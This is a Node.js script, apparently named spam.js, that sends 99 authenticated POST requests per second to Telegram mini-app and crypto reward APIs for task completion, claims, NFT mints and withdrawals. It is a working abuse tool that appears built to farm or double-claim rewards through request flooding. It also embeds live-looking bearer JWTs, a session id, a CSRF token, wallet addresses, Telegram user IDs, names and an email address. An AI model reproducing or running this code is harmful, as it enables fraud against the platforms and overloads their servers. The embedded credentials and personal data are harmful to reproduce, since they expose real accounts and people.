// Still from spam.js, Feat there!
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
import { serialize } from 'cookie';

// const endpoint = 'https://hotinstantpayment.cyynai.com/verify-tg-task/60/';
// const endpoint = 'https://api.miniapp.tiwiflix.pro/account/claims';
// const endpoint = 'https://api.miniapp.tiwiflix.pro/account/nft-mints';
// const endpoint = 'https://api.miniapp.tiwiflix.pro/account/complete-task';
// const endpoint = 'https://tgapp.agjogo.me/api/checkInChannelAddTimes';
// const endpoint = 'https://api.pandafuture.ai/v1/CoinAssets/withdraw?token=d3a09a41f22381120d85be4849d65e5af674ec48&lang=en-US';
const endpoint = 'https://api.oraust.com/api/task/do_task/6181?d=1756934027965';

// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiY2JjOWM0MjMtYzVhMi00OTI1LTk0MjYtYWEyZDdkY2M0ZGMyIiwibmFtZSI6IkFsZXggT2d1bmtzIiwidGVsZWdyYW1JZCI6IjY1NjI4NDE4MTIiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiYWxleG9ndW5rcyIsImNsYWltQWRkcmVzcyI6bnVsbCwidG9uQWRkcmVzcyI6bnVsbCwiaXNQcmVtaXVtIjp0cnVlLCJyZWZlcnJhbENvZGUiOiJxZktrVm5jTCIsInJlZmVycmVySWQiOiI0OTI5ZjY0ZS0yZGQyLTQxZWUtYjU1MS01MTJlZDExNDYyZDUiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImUyMmJmMjQ4LTAyZGYtNDk4Ni04ZTY1LTYzNDJjOWE5ODUxZiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMDk6MTM6MjAuMDI4WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMzBUMTA6MDg6MjIuNDU1WiJ9LCJ1c2VySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJpYXQiOjE3NTY1NDg1MDJ9.JJPi2tTW5jFzZjzxeassqxHTaPFS2TyC_A7uTgx4H2k';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiZDhjZDA0ZmYtNmNkZi00OWEyLWIxNGYtN2I2ODc1MDA3MDIzIiwibmFtZSI6IkFsZXggIiwidGVsZWdyYW1JZCI6IjcwMjIyODE2NzAiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiYWxleG9oZ2VlIiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJoNFVrNVFTZiIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMTk6Mzg6MjYuMDE2WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMzBUMTA6MjA6NTYuNzIzWiJ9LCJ1c2VySWQiOiJkOGNkMDRmZi02Y2RmLTQ5YTItYjE0Zi03YjY4NzUwMDcwMjMiLCJpYXQiOjE3NTY1NDkyNTZ9.2DJz-Fy_wTa4_UhXpNG6P-7u6_DIJvYu6Q9Yjzopq5c';

const authHeader = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhcGkub3JhdXN0LmNvbSIsImF1ZCI6ImFwaS5vcmF1c3QuY29tIiwiaWF0IjoxNzU2OTMyMjUxLCJuYmYiOjE3NTY5MzIyNTEsImV4cCI6MTc1Nzc5NjI1MSwianRpIjp7ImlkIjo2NTI5LCJ0eXBlIjoiYXBpIn19.RRAwNLloBmv9kDDIIYsUnnr3LCtuIZbRxJ3z7zsNICs';

// const cookies = serialize('sessionid', 'vb624q3mq9ifj1elsd13rxtce8f12ch6')


// const payload = {
    //     value: "1000000000000",
    //     claimAddress: "0x19fd09f9d9434fd48581e0b5e9e535d884ee2be0",
    //     fee: 20
    // }
    
const payload = {
    // ownerAddress: "UQAepCzq-WQL3cqycorz2DVDnOdL5B1k-gHvsxum0B2x32ee",
    // ownerAddress: "UQA3wisEFfUzlWojpbgscxKy_KoaP4X7Vbnvr4VgFp-jHCaU",
    // ownerAddress: "UQBjeET2ijSYyplD9cYfaoYKYQ2mVBcD0TfGeyr7zBeCtokV",
    // ownerAddress: "UQDbYEvbC227NzDtI4FMz-N5Qr9PzUKr1BnF854t_IkHuZkI",
    // ownerAddress: "UQC4Y9NRh_G6hcMd-6t_gN64Ct1BdEIPDBFsjaD-1AA7fnnN",
    ownerAddress: "UQALAqmvW68nPdMX8x1khAznhLYUhOsjQuEOoy7altiAEd69"
}

// const payload = {
//     taskId: "8d126c78-2626-41cc-a516-96cd9d6e2b6d"
// }

// const payload = {
//     "activityId": 2,
//     "tgBotId": "7969301189",
//     "tgUserId": 7022281670,
//     "channelName": "WGJOGO",
//     "channelId": "-1002662533439",
//     "signature": "a324b454aa5c4d64402600cec766abef"
// }

// const payload = {
//     post: {
//         email: "temmyteegraphic@gmail.com",
//         amount: 1000,
//         coin: "PDF",
//         code: "66528"
//     },
//     token: "d3a09a41f22381120d85be4849d65e5af674ec48",
//     lang: "en-US"
// }

// const payload = {
//     post: {
//         amount: "",
//         to_address: "AQhivep4N5kKTeu8xckvcFyQxNeG1RABTY2GFUcffZAR",
//         chain: "SOL",
//         coin: "AAA"
//     },
//     token: "d3a09a41f22381120d85be4849d65e5af674ec48",
//     lang: "en-US"
// }

// AQhivep4N5kKTeu8xckvcFyQxNeG1RABTY2GFUcffZAR

let totalRequestsSent = 0;
async function sendRequests(requestCount) {
    const now = new Date();
    const time = now.toLocaleTimeString();

    const promises = [];
    
    for (let i = 0; i < requestCount; i++) {
        promises.push(
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Authorization': authHeader,
                    'Content-type': 'application/json',
                    // 'Cookie': cookies,
                    // 'x-csrftoken': 'DMFKdkEMORT4xUo4Gm8YYQICniUPTQsAAvf8pSjS7l7IJHY4U020KSeLEbleyCQ0'
                },
                // body: JSON.stringify(payload)
            })
            .then(response => response.text())
            .then(data => {
                console.log(`${data} at: ${time}`);
                totalRequestsSent += 1;
            })
            .catch(err => console.error('Request failed', err))
        );
    }

    await Promise.all(promises);
    console.log(`Sent ${requestCount} requests successfully`);
}

const requestsPerSecond = 99;
setInterval(() => {
    sendRequests(requestsPerSecond);
    console.log(`\n Total requests sent: ${totalRequestsSent}\n`)
}, 1000);